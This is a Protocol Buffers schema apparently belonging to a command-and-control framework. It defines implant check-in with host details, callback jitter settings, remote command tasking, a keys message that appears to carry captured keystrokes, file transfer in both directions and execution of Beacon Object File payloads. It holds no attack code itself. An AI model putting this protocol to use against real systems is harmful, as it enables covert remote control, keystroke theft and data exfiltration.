syntax = "proto3";

package patronobuf;
option go_package = "github.com/PatronC2/Patronobuf/go/patronobuf";

enum RequestType {
  STARTUP = 0;
  CONFIGURATION = 1;
  COMMAND = 2;
  COMMAND_STATUS = 3;
  KEYS = 4;
  FILE = 5;
  FILE_TO_SERVER = 6;
  BOF_EXECUTE = 7;
}

enum ResponseType {
  STARTUP_RESPONSE = 0;
  CONFIGURATION_RESPONSE = 1;
  COMMAND_RESPONSE = 2;
  COMMAND_STATUS_RESPONSE = 3;
  KEYS_RESPONSE = 4;
  FILE_RESPONSE = 5;
  FILE_TRANSFER_STATUS = 6;
  BOF_EXECUTE_RESPONSE = 7;
}

message Request {
  RequestType type = 1;

  oneof payload {
    StartupRequest startup = 2;
    ConfigurationRequest configuration = 3;
    CommandRequest command = 4;
    CommandStatusRequest command_status = 5;
    KeysRequest keys = 6;
    FileRequest file = 7;
    FileToServer file_to_server = 8;
    BoFExecuteRequest bof_execute = 9;
  }
}

message Response {
  ResponseType type = 1;

  oneof payload {
    StartupResponse startup_response = 2;
    ConfigurationResponse configuration_response = 3;
    CommandResponse command_response = 4;
    CommandStatusResponse command_status_response = 5;
    KeysResponse keys_response = 6;
    FileResponse file_response = 7;
    FileTransferStatusResponse file_transfer_status_response = 8;
    BoFExecuteResponse bof_execute_response = 9;
  }
}

message StartupRequest {
  string filepath = 1;
  string username = 2;
  string hostname = 3;
  string ostype = 4;
  string arch = 5;
  string osbuild = 6;
  string cpus = 7;
  string memory = 8;
  string agentip = 9;
  repeated string capabilities = 10;
}

message StartupResponse {
  string uuid = 1;
}

message ConfigurationRequest {
  string uuid = 1;
  string serverip = 2;
  string serverport = 3;
  string callbackfrequency = 4;
  string callbackjitter = 5;
  string masterkey = 6;
  string status = 7;
  repeated Tag tags = 8;
  int64 nextcallback_unix = 9;
  string transportprotocol = 10;
}

message ConfigurationResponse {
  string serverip = 2;
  string serverport = 3;
  string transportprotocol = 6;
  int64 sleep_seconds = 7;
}

message CommandRequest {
  string uuid = 1;
}

message CommandResponse {
  string uuid = 1;
  string commandtype = 2;
  string commandid = 3;
  string command = 4;
}

message CommandStatusRequest {
  string uuid = 1;
  string commandid = 2;
  string result = 3;
  string output = 4;
}

message CommandStatusResponse {
  string uuid = 1;
}

message BoFExecuteRequest {
  string uuid = 1;           // Agent UUID to execute on
  string platform = 2;       // "windows" or "linux"
  string function_name = 3;  // Function name in BOF (e.g., "go")
  bytes payload = 4;         // Compiled BOF binary
}

message BoFExecuteResponse {
  string uuid = 1;           // Agent UUID
  string function_name = 2;  // Function that was executed
  bool success = 3;          // Whether execution succeeded
  string output = 4;         // Output from BOF execution
}

message KeysRequest {
  string uuid = 1;
  string keys = 2;
}

message KeysResponse {
  string uuid = 1;
}

message FileRequest {
  string uuid = 1;
}

message FileResponse {
  string fileid = 1;
  string uuid = 2;
  string transfertype = 3;
  string filepath = 4;
  bytes chunk = 5;
}

message FileToServer {
  string fileid = 1;
  string uuid = 2;
  string transfertype = 3;
  string path = 4;
  string status = 5;
  bytes chunk = 6;
}

message FileTransferStatusResponse {
  string fileid = 1;
  string uuid = 2;
}

message Tag {
  string key = 1;
  string value = 2;
}

message BoFInfo {
  string uuid = 1;                // Unique identifier for the BOF
  string function_name = 2;       // Name of the function to execute
  string platform = 3;            // "windows" or "linux"
  string description = 4;         // Human-readable description
  bytes payload = 5;              // Binary BOF payload
  optional uint64 uploaded_at = 6; // Timestamp of upload (Unix epoch)
}
